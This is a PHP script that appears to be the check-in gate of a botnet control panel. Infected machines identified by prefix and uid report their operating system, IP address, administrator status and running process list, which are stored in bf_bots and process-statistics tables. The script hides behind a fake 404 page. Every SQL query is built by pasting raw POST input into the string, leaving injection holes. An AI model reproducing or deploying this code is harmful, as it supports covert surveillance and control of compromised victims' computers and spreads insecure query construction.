<?php

error_reporting(0);
ini_set('error_reporting', 0);

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.php');

$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);
unset($cfg_db);

$_POST['os'] = urldecode($_POST['os']);
$_POST['plist'] = urldecode($_POST['plist']);
$_POST['admin'] = empty($_POST['admin']) ? 0 : (int) $_POST['admin'];

if(!preg_match('~^([a-zA-Z0-9 ]+)$~', $_POST['os'])) print_data('NOT_OS!', true);

$return = true;

$bot = $mysqli->query('SELECT id, prefix, uid FROM bf_bots WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');

if($bot->prefix != $_POST['prefix'] && $bot->uid != $_POST['uid']){	/*
	if(function_exists('geoip_country_code_by_name')){
		$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
	}else{
		if(file_exists($dir . 'cache/geoip/')){
			require_once($dir . 'cache/geoip/geoip.inc');
			$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
			$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
			geoip_close($gi);
			unset($gi);
			unset($record);
		}
	}
	if(empty($country)) $country = 'UNKNOWN';

	$mysqli->query("INSERT INTO bf_country (code) VALUES ('".$country."')");
	$mysqli->query("INSERT INTO bf_bots_ip (prefix, uid, ip, country) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '".$_SERVER['REMOTE_ADDR']."', '".$country."')");
	$mysqli->query("INSERT INTO bf_bots (uid, prefix, country, ip, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".time()."', '".time()."')");
	*/
	print_data('NOT_BOT!', true);
}

$mysqli->query('update bf_bots set os = \''.$_POST['os'].'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\', admin = \''.$_POST['admin'].'\' WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
$mysqli->query('INSERT DELAYED INTO bf_process (prefix, uid, plist) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$_POST['plist'].'\')');

$plist = explode(',', $_POST['plist']);

if(count($plist) > 0){	foreach($plist as $item){		$mysqli->query('INSERT DELAYED INTO bf_process_stats (name, count) VALUES (\''.$item.'\', \'1\') ON duplicate KEY UPDATE count=count+1');
	}
}else{	$return .= ',plist1';
}

if($return == true){	print_data('OK!', true);
}else{	print_data('NOT_OK! - ' . $return, true);
}

exit;

?>